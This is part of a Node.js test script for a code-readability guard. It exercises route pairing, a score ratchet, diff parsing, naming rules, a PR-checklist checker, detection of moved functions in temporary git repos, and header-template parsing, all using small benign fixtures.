const { matchBase } = require('../tools/readability/guard.cjs');
const routePairs = matchBase(routeHead, routeBase);
const pairedRoute = (route) => { const head = routeHead.find((fn) => fn.route === route); const base = routePairs.get(head); return base && base.route; };
ok(routeHead[0].route === 'GET /a' && routeHead[1].route === 'POST /b' && !routeHead[2].route, 'measure: a handler passed to router.<verb>(\'path\', …) carries its route; a plain function carries none');
ok(pairedRoute('GET /a') === 'GET /a' && pairedRoute('POST /b') === 'POST /b', 'guard: a handler moved 9 lines down still pairs with its own route (INT7b)');
ok(routePairs.get(routeHead[2]) === routeBase[2], 'guard: a function with no route pairs by name + params, as before');
/* a 36-line shift above two anonymous callbacks of one name + params: each pairs with its own size, not the nearer line */
const CALLBACKS = (pad) => pad + 'function big(rows) {\n  var total = 0;\n  rows.forEach(function (b) {\n' + '    total += 1;\n'.repeat(28) + '  });\n  return total;\n}\nfunction small(rows) {\n  var total = 0;\n  rows.forEach(function (b) {\n    total += b;\n  });\n  return total;\n}\n';
const callBase = measure.factsFromText('public/app/cb.js', CALLBACKS('')).functions.filter((fn) => !fn.name);
const callHead = measure.factsFromText('public/app/cb.js', CALLBACKS('\n'.repeat(36))).functions.filter((fn) => !fn.name);
const callPairs = matchBase(callHead, callBase);
ok(callHead.length === 2 && callPairs.get(callHead[0]) === callBase[0] && callPairs.get(callHead[1]) === callBase[1], 'guard: anonymous twins pair by size as well as line, so a big shift does not cross them (matchBase defect)');
const ratchet = require('../tools/readability/ratchet.cjs');
const merged = ratchet.tighten({ 'a.js': { score: 3 }, 'b.js': { score: 1 } }, { 'a.js': { score: 1 }, 'b.js': { score: 5 }, 'c.js': { score: 0 } });
ok(merged.rows['a.js'].score === 1 && merged.rows['b.js'].score === 1 && merged.rows['c.js'].score === 0 && merged.refused.length === 1 && merged.lowered.length === 1, 'ratchet: tighten lowers a.js, refuses b.js, adds c.js');
ok(ratchet.score(facts).score === 2 && ratchet.risen({ score: 0, cryptic: 0, emptyCatch: 0 }, ratchet.score(facts)).join(',') === 'cryptic 0 → 1,emptyCatch 0 → 1', 'ratchet: the score is the sum of the breakdown, and risen() names what rose');
const diffReader = require('../tools/readability/changed.cjs');
const parsed = diffReader.parseDiff('diff --git a/x.js b/x.js\n--- a/x.js\n+++ b/x.js\n@@ -3,0 +4,2 @@\n+a\n+b\n@@ -10 +12 @@\n-c\n+d\ndiff --git a/new.js b/new.js\n--- /dev/null\n+++ b/new.js\n@@ -0,0 +1,3 @@\ndiff --git a/gone.js b/gone.js\n--- a/gone.js\n+++ /dev/null\n');
ok(parsed.length === 3 && parsed[0].status === 'modified' && JSON.stringify(parsed[0].ranges) === '[[4,5],[12,12]]' && parsed[1].status === 'added' && parsed[2].status === 'deleted', 'changed: the diff grammar — modified ranges, an added file, a deleted file');
const baselineReport = require('../tools/readability/baseline.cjs');
const metrics = baselineReport.metrics('web', tmp, 5);
ok(metrics.files === 15 && metrics.R3.over_80 === 4 && metrics.R1.cryptic_declarations >= 2, 'baseline: R1–R6 over the fixture (15 files, 4 functions over 80 lines)');

console.log('\n6b · the naming rule: Google JS 6.1 scope test (DECISIONS 2026-11-12)');
const crypticIn = (code) => measure.factsFromText('public/app/naming.js', HEADER('naming') + code).cryptic.map((declaration) => declaration.name);
const inTwelve = (decl) => 'function twelveLines(rows) {\n  ' + decl + '\n' + '  rows.length;\n'.repeat(9) + '}\n';
ok(crypticIn(inTwelve('const r = rows.length;')).join() === 'r', '`r` in a 12-line function is flagged');
ok(crypticIn('const threeLines = (rows) => {\n  const r = rows.length;\n  return r;\n};\n').length === 0, '`r` in a 3-line arrow is not flagged');
ok(crypticIn('const oneLine = (rows) => rows.map((r) => r.id);\n').length === 0, 'an arrow parameter in a one-line callback is not flagged');
ok(crypticIn(inTwelve('let i = 0; let j = 0; let k = 0;')).length === 0, '`i` `j` `k` in a 12-line function are not flagged (counters, any scope)');
ok(crypticIn(inTwelve('const rw = rows.length;')).join() === 'rw', '`rw`, a letter-dropping abbreviation in a long scope, is flagged');
ok(crypticIn('function tenLines(rows) {\n  const rw = rows.length;\n' + '  rows.length;\n'.repeat(7) + '}\n').length === 0, 'a function of exactly 10 lines is still inside the short-name scope');
ok(crypticIn('function elevenLines(rows) {\n  const rw = rows.length;\n' + '  rows.length;\n'.repeat(8) + '}\n').join() === 'rw', 'a function of 11 lines is outside it');
ok(crypticIn('const r = 1;\n').join() === 'r', '`r` at module level is flagged (no scope to shelter in)');
ok(crypticIn(inTwelve('try { rows.length; } catch (e) { rows.length; } const id = rows.length; const x = id; const y = x;')).length === 0, 'e, x, y and the conventional word id stay allowed in a long scope');

console.log('\n7 · pr-checklist (tools/pr-checklist.cjs): the body must carry the five lines with numbers; bots and docs-only skip');
const checklist = require('../tools/pr-checklist.cjs');
const filledBody = lateResult.markdown.replace(/`<doc>`/g, 'n/a').replace('`<word>` → reused/widened `<name>` (or "nothing exists")', '`readability` → widened `tools/readability.cjs`');
ok(checklist.problems(filledBody).length === 0, 'the tool\'s own --md output, with Pass 0 and the docs filled, passes');
ok(checklist.problems(fs.readFileSync(path.join(ROOT, '.github/pull_request_template.md'), 'utf8')).length === 4, 'the untouched template fails on its four placeholder lines');
ok(checklist.problems('no checklist at all').length === 5, 'a body with no checklist is missing all five lines');
ok(checklist.skipReason('dependabot[bot]', ['package.json']) && checklist.skipReason('me', ['docs/a.md', 'README.md']) && !checklist.skipReason('me', ['docs/a.md', 'lib/x.js']), 'skips: a dependency bot · docs-only; a code change never skips');
/* MNT-16: the reader judges the §6 block only; an earlier mention of "Pass 3" is prose, not the line */
const prose = 'Pass 3 is why this PR exists (the header work).\nPass 0 stays as before.\n\n';
ok(checklist.problems(prose + filledBody).length === 0, 'MNT-16: a body that mentions Pass 3 / Pass 0 before the checklist is judged on the §6 block alone');
ok(checklist.problems(filledBody.replace(/(Pass 0[^\n]*?) → /, '$1 - ')).length === 0, 'MNT-16: a Pass 0 line written without the arrow still counts as filled');
const unfilledBlock = filledBody.replace(/(Pass 1[^\n]*)/, '- [x] Pass 1 · shrink: lines `<before → after>`');
ok(checklist.problems(prose + unfilledBlock + '\n\n## Notes\nlines 3 → 2 · complexity 4 → 3').length === 1, 'MNT-16: strict — a number missing in the block is not rescued by numbers written after it');
ok(checklist.problems(prose + '## §6 checklist\n- [ ] Pass 0 · seams: `x` → y\n').length === 4, 'MNT-16: a block that omits Pass 1, 2, 3 and Guard green fails on those four');

console.log('\n8 · an EXACT move keeps its score (Athi R-moved (a)): moved code is not new code');
const moveRules = require('../tools/readability/moves.cjs');
const summed = moveRules.plus({ score: 2, cryptic: 2, long40: 0 }, { score: 1, cryptic: 0, long40: 1 });
ok(summed.score === 3 && summed.cryptic === 2 && summed.long40 === 1 && moveRules.plus({ score: 2 }, null).score === 2, 'moves: a carried score adds counter by counter; nothing carried leaves the row as it is');
/** a base repo, the ratchet written from it, then the head files; returns the guard's verdict and the ratchet before / after */
function moveScenario(baseFiles, headFiles, extra, slack) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-readability-move-'));
  const put = (files) => { for (const [file, text] of Object.entries(files)) { fs.mkdirSync(path.join(dir, path.dirname(file)), { recursive: true }); if (text === null) fs.rmSync(path.join(dir, file), { force: true }); else fs.writeFileSync(path.join(dir, file), text); } };
  put(baseFiles);
  git(dir, ['init', '-q']); git(dir, ['config', 'user.email', 'fixture@example']); git(dir, ['config', 'user.name', 'fixture']);
  git(dir, ['add', '-A']); git(dir, ['commit', '-q', '-m', 'base']);
  const sha = git(dir, ['rev-parse', 'HEAD']);
  run([TOOL, '--repo', 'web', '--root', dir, '--write']);
  const rows0 = JSON.parse(fs.readFileSync(path.join(dir, 'readability.ratchet.json'), 'utf8'));
  if (slack) { const rows = JSON.parse(fs.readFileSync(path.join(dir, 'readability.ratchet.json'), 'utf8')); rows[slack].score += 1; rows[slack].cryptic += 1; fs.writeFileSync(path.join(dir, 'readability.ratchet.json'), JSON.stringify(rows)); }
  put(headFiles);
  const verdict = run([TOOL, '--changed', '--repo', 'web', '--root', dir, '--base', sha, '--ratchet', '--trace', 'none', '--md', '--today', '2026-10-31'].concat(extra || []));
  const rows1 = () => JSON.parse(fs.readFileSync(path.join(dir, 'readability.ratchet.json'), 'utf8'));
  return { verdict, rows0, rows1, dir };
}
const sumOf = (rows) => Object.values(rows).filter((row) => typeof row === 'object').reduce((total, row) => total + row.score, 0);
const CRYPTIC_FN = '// listTotals: adds the rows up (fixture)\nfunction listTotals(rows) {\n  var q = 0;\n' + PAD + '  for (const row of rows) q += row;\n  return q;\n}\n';
const SRC0 = HEADER('src') + CRYPTIC_FN + 'function keepOne(rows) {\n  return rows.length;\n}\n';
const SRC1 = HEADER('src') + 'function keepOne(rows) {\n  return rows.length;\n}\n';
const DST0 = HEADER('dst') + 'function keepTwo(rows) {\n  return rows.length;\n}\n';
const REFORMATTED = CRYPTIC_FN.replace('// listTotals: adds the rows up (fixture)', '// the same function, a new comment').replace('  var q = 0;', '  var q   =   0; // spaced');

const exact = moveScenario({ 'public/app/src.js': SRC0, 'public/app/dst.js': DST0 }, { 'public/app/src.js': SRC1, 'public/app/dst.js': DST0 + REFORMATTED });
ok(exact.verdict.status === 0 && /moved: 1 function \(exact body match\)/.test(exact.verdict.stdout), 'an exact move (whitespace and comments differ) passes and prints "moved: N functions (exact body match)"' + (exact.verdict.status ? '\n' + exact.verdict.stdout : ''));
ok(/listTotals[^\n]*public\/app\/src\.js:\d+ → public\/app\/dst\.js:\d+/.test(exact.verdict.stdout), 'the move is listed with its old and new place');

const intoNew = moveScenario({ 'public/app/src.js': SRC0 }, { 'public/app/src.js': SRC1, 'public/app/fresh.js': HEADER('fresh') + REFORMATTED }, ['--write']);
const rowsNew = intoNew.rows1();
ok(intoNew.verdict.status === 0 && rowsNew['public/app/fresh.js'] && rowsNew['public/app/fresh.js'].cryptic === 1, 'a move to a NEW file carries the score: it passes and its row holds the cryptic name (' + JSON.stringify(rowsNew['public/app/fresh.js']) + ')' + (intoNew.verdict.status ? '\n' + intoNew.verdict.stdout : ''));
ok(rowsNew['public/app/src.js'].cryptic === 0 && sumOf(rowsNew) === sumOf(intoNew.rows0), 'the ratchet total does not move by a move alone (' + sumOf(intoNew.rows0) + ' → ' + sumOf(rowsNew) + ')');

const renamed = moveScenario({ 'public/app/src.js': SRC0 }, { 'public/app/src.js': SRC1, 'public/app/fresh.js': HEADER('fresh') + REFORMATTED.replace(/\bq\b/g, 'z') });
ok(renamed.verdict.status === 1 && /\[cryptic-name\]/.test(renamed.verdict.stdout) && !/moved: /.test(renamed.verdict.stdout), 'a move plus ONE renamed variable fails as today (judged as new code, no "moved" line)');

const copied = moveScenario({ 'public/app/src.js': SRC0 }, { 'public/app/src.js': SRC0, 'public/app/fresh.js': HEADER('fresh') + REFORMATTED });
ok(copied.verdict.status === 1 && !/moved: /.test(copied.verdict.stdout), 'a COPY (the old function stays) is not a move: it fails as new code');

const dropped = moveScenario({ 'public/app/src.js': SRC0 }, { 'public/app/src.js': SRC1 });
ok(dropped.verdict.status === 0 && /tighten the ratchet/.test(dropped.verdict.stdout) && !/moved: /.test(dropped.verdict.stdout), 'a deleted-but-not-re-added function lowers debt as today (tighten told, no move)');

const whole = moveScenario({ 'public/app/src.js': SRC0, 'public/app/keep.js': DST0 }, { 'public/app/src.js': null, 'public/app/fresh.js': HEADER('fresh') + REFORMATTED, 'public/app/keep.js': DST0 });
ok(whole.verdict.status === 0 && /moved: 1 function \(exact/.test(whole.verdict.stdout), 'a function moved out of a DELETED file counts as a move too');

/* the binding name sits OUTSIDE the function node (const x = () => …, key: function …): renaming it is a change, in EVERY function form (cb-critic, #438) */
const FORMS = {
  declaration: ['function sumRows(rows) {\n  let total = 0;\n  for (const row of rows) total += row;\n  return total;\n}\n', 'sumRows'],
  'const arrow': ['const sumRows = (rows) => {\n  let total = 0;\n  for (const row of rows) total += row;\n  return total;\n};\n', 'sumRows'],
  'assigned expression': ['const holder = {};\nholder.sumRows = function (rows) {\n  let total = 0;\n  for (const row of rows) total += row;\n  return total;\n};\n', 'sumRows'],
  'object method': ['const holder = {\n  sumRows(rows) {\n    let total = 0;\n    for (const row of rows) total += row;\n    return total;\n  }\n};\n', 'sumRows'],
  'class method': ['class Holder {\n  sumRows(rows) {\n    let total = 0;\n    for (const row of rows) total += row;\n    return total;\n  }\n}\n', 'sumRows']
};
const formRuns = [];
for (const [form, [code, binding]] of Object.entries(FORMS)) {
  const sameName = moveScenario({ 'public/app/src.js': HEADER('src') + code + SRC1.replace(HEADER('src'), '') }, { 'public/app/src.js': SRC1, 'public/app/fresh.js': HEADER('fresh') + code });
  const otherName = moveScenario({ 'public/app/src.js': HEADER('src') + code + SRC1.replace(HEADER('src'), '') }, { 'public/app/src.js': SRC1, 'public/app/fresh.js': HEADER('fresh') + code.split(binding).join('totalRows') });
  formRuns.push(sameName, otherName);
  ok(sameName.verdict.status === 0 && /moved: 1 function/.test(sameName.verdict.stdout), form + ' moved unchanged = a move' + (sameName.verdict.status ? '\n' + sameName.verdict.stdout : ''));
  ok(!/moved: /.test(otherName.verdict.stdout), form + ' moved with its binding renamed = new code (no "moved" line)');
}
const ARROW = FORMS['const arrow'][0];
const slackBase = { 'public/app/src.js': HEADER('src') + ARROW + SRC1.replace(HEADER('src'), ''), 'public/app/dst.js': DST0 };
const slackHead = { 'public/app/src.js': SRC1, 'public/app/dst.js': DST0 + ARROW.split('sumRows').join('q') };
const slack = moveScenario(slackBase, slackHead, [], 'public/app/dst.js');
formRuns.push(slack);
ok(slack.verdict.status === 1 && /\[cryptic-name\]/.test(slack.verdict.stdout) && !/moved: /.test(slack.verdict.stdout), 'a moved arrow with its binding renamed to a cryptic name fails even when the target row has slack');
for (const scenario of formRuns) fs.rmSync(scenario.dir, { recursive: true, force: true });

const movedBody = exact.verdict.stdout.slice(exact.verdict.stdout.indexOf('## §6')).replace(/`<doc>`/g, 'n/a').replace('`<word>` → reused/widened `<name>` (or "nothing exists")', '`readability` → widened');
ok(/- moved: 1 function/.test(movedBody) && checklist.problems(movedBody).length === 0, 'the §6 checklist with the moved line still passes pr-checklist');
for (const scenario of [exact, intoNew, renamed, copied, dropped, whole]) fs.rmSync(scenario.dir, { recursive: true, force: true });

// ── 7 · the header-template grammar (tools/readability/headers.cjs, PM/HEADER-TEMPLATE.md): a full header passes, each missing field is named, a test needs CARD or UNIT
const headerKit = require('../tools/readability/headers.cjs');
const FULL = ['/* public/app/x.js — shows x.', '   OWNER     cb-ux-locale', '   ID        CMP001', '   OWNS      x', '   FLOW      read -> paint', '   CARD      07-x/x', '   RISK      plain', '*/', ''].join(String.fromCharCode(10));
ok(headerKit.stateOf('component', headerKit.readFields(FULL, 'public/app/x.js')).state === 'full', 'header template: a header with every required field is full');
ok(headerKit.stateOf('component', headerKit.readFields(FULL.replace(/ +RISK +plain\n/, ''), 'public/app/x.js')).lacks.join() === 'RISK', 'header template: a header without RISK is partial and names RISK');
ok(headerKit.stateOf('module', headerKit.readFields('const a = 1;\n', 'lib/a.js')).state === 'none', 'header template: no comment at all is none');
ok(headerKit.stateOf('test', headerKit.readFields(['// tests/a.test.cjs — a.', '// OWNER cb-qa', '// UNIT 08/Rewards'].join(String.fromCharCode(10)), 'tests/a.test.cjs')).state === 'full', 'header template: a test with OWNER and UNIT instead of CARD is full (test-evidence grammar kept)');
const typedKind = headerKit.readFields(FULL.replace('   OWNER', '   KIND      module' + String.fromCharCode(10) + '   OWNER'), 'public/app/x.js');
ok(headerKit.findings('component', typedKind).kindWrong === 1 && headerKit.findings('component', typedKind).derivedTyped === 1, 'header template: a typed KIND that disagrees with the path is a finding, and any typed KIND is a derived-field finding');
ok(headerKit.readFields('/* lib/a.js — x\n   OWNS: y\n*/', 'lib/a.js').fields.OWNS === 'y' && headerKit.readFields('/* lib/a.js — x\n   owns the thing\n*/', 'lib/a.js').fields.OWNS === undefined, 'header template: "OWNS:" is a field; prose "owns the thing" is not');
ok(headerKit.readFields('/* lib/a.js — x\n   ID of the party\n*/', 'lib/a.js').fields.ID === undefined, 'header template: prose starting with ID is not an ID');

const grammar = require('../tools/readability/header-grammar.cjs');
ok(grammar.parseFields('/* lib/a.js — x\n   OWNS      y\n*/', 'lib/a.js').fields.OWNS === 'y', 'header grammar: parseFields reads a labelled OWNS field (unit test of header-grammar.cjs)');
ok(grammar.parseFields('/* lib/a.js — x\n   owns the thing\n*/', 'lib/a.js').fields.OWNS === undefined, 'header grammar: prose that merely says owns is not a field (unit test of header-grammar.cjs)');

console.log('\n8 · the header template: a warning for a NEW file until the switch-over date, never a score change, never judges an old file');
fs.writeFileSync(path.join(tmp, 'public/app/brand-new.js'), HEADER('brand-new') + 'module.exports = 1;' + String.fromCharCode(10));
git(tmp, ['add', '-A']);
const earlyRun = run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--trace', 'none', '--today', '2026-10-16', '--json', out]);
const earlyResult = JSON.parse(fs.readFileSync(out, 'utf8'));
const templateWarns = earlyResult.findings.filter((finding) => finding.rule === 'header-template');
const modifiedFiles = earlyResult.files.filter((file) => file.status === 'modified').map((file) => file.file);
ok(templateWarns.length === 1 && templateWarns[0].level === 'warn' && templateWarns[0].text.includes('public/app/brand-new.js'), 'a new file without the template WARNS (before ' + headerKit.TEMPLATE_STRICT_FROM + '), and only the new file does');
ok(modifiedFiles.length > 0 && !modifiedFiles.some((file) => templateWarns.some((finding) => finding.text.includes(file))), 'a touched OLD file gets no template finding at all');
run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--trace', 'none', '--today', headerKit.TEMPLATE_STRICT_FROM, '--json', out]);
const afterSwitch = JSON.parse(fs.readFileSync(out, 'utf8'));
ok(afterSwitch.findings.filter((finding) => finding.rule === 'header-template' && finding.level === 'fail').length === 1, 'from the switch-over date the new file without the template FAILS (and no old file is judged)');
const legacyPath = path.join(tmp, 'public/app/legacy-words.js');
fs.writeFileSync(legacyPath, '/* legacy-words.js — purpose: a fixture. Called by the test. Flow: read → paint.\n * CARD qa/legacy-words\n */\nmodule.exports = 1;\n');
const legacyFacts = require('../tools/readability/measure.cjs').fileFacts({ abs: legacyPath, rel: 'public/app/legacy-words.js' });
ok(require('../tools/readability/ratchet.cjs').headerComplete(legacyFacts.header) && !legacyFacts.header.template.fields.OWNS, 'the R4 words rule still scores a prose header as complete (score unchanged vs main) while the template reader says OWNS is missing');
// a rename is not a new file: an old file moved by git mv keeps its old-file standing (HEADER-TEMPLATE: old files are never judged)
const movedFrom = git(tmp, ['ls-files', 'public/app']).split(String.fromCharCode(10)).find((name) => /\.js$/.test(name) && !name.includes('brand-new') && !name.includes('legacy-words'));
const movedTo = movedFrom.replace(/\.js$/, '-renamed.js');
git(tmp, ['mv', movedFrom, movedTo]);
git(tmp, ['add', '-A']);
run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--trace', 'none', '--today', headerKit.TEMPLATE_STRICT_FROM, '--json', out]);
const afterMove = JSON.parse(fs.readFileSync(out, 'utf8'));
const movedFacts = require('../tools/readability/measure.cjs').fileFacts({ abs: path.join(tmp, movedTo), rel: movedTo });
ok(headerKit.missing(headerKit.kindOf('web', movedTo), movedFacts.header.template).length > 0, 'rename fixture: the moved old file really lacks the template (the proof is not vacuous)');
ok(!afterMove.findings.some((finding) => finding.rule === 'header-template' && finding.text.includes(movedTo)), 'a renamed OLD file (git mv) gets no template finding, even from the switch-over date');
ok(afterMove.findings.some((finding) => finding.rule === 'header-template' && finding.level === 'fail' && finding.text.includes('brand-new.js')), 'a truly new file still fails from the switch-over date in the same run');

/* ── MNT-51: an html page's header is read from the page itself, not from the first inline script ─────────────── */
{
  const measure = require(path.join(ROOT, 'tools/readability/measure.cjs'));
  const HEAD = '<!-- public/x.html - a page. OWNS the x numbers. CALLED BY the router. FLOW read → paint. CARD qa/fixture-card -->\n';
  const read = (text) => measure.factsFromText('public/x.html', text).header;
  const noScript = read('<!doctype html><html><head>' + HEAD + '<title>x</title></head><body><p>hi</p></body></html>\n');
  ok(noScript.has && noScript.owns && noScript.callers && noScript.flow && noScript.card === 'qa/fixture-card', 'MNT-51: a page with NO inline script still reads its <!-- --> header');
  const laterScript = read('<!doctype html><html><head>' + HEAD + '</head><body><script src="/app/a.js"></script><script>var go = 1;</script></body></html>\n');
  ok(laterScript.has && laterScript.card === 'qa/fixture-card', 'MNT-51: a page whose only inline script comes after the header still reads it');
  const scriptOnly = read('<!doctype html><html><body><script>/* OWNS the y. CALLED BY z. FLOW a → b. CARD qa/js-card */\nvar go = 1;</script></body></html>\n');
  ok(scriptOnly.has && scriptOnly.card === 'qa/js-card', 'MNT-51: a header comment at the top of the first inline script still counts');
  const capTags = read('<!doctype html><html><head><title>x</title></head><body><script src="/app/cap-a.js"></script><script src="/app/cap-b.js"></script></body></html>\n');
  ok(!capTags.has, 'MNT-51: /app/cap-*.js script tags in a page are not a header (no comment = no header)');
  const capInCode = read('<!doctype html><html><body><script>var s = "<script src=\'/app/cap-a.js\'>"; go();</script></body></html>\n');
  ok(!capInCode.has, 'MNT-51: /app/cap-*.js text inside page code is not a header line');
}

fs.rmSync(tmp, { recursive: true, force: true }); fs.rmSync(traceOut, { recursive: true, force: true });
console.log(bad ? '\n✗ ' + bad + ' FAILED — the readability guard no longer judges what it claims to' : '\n✓ every §6 rule bites once, and passes once');
process.exit(bad ? 1 : 0);
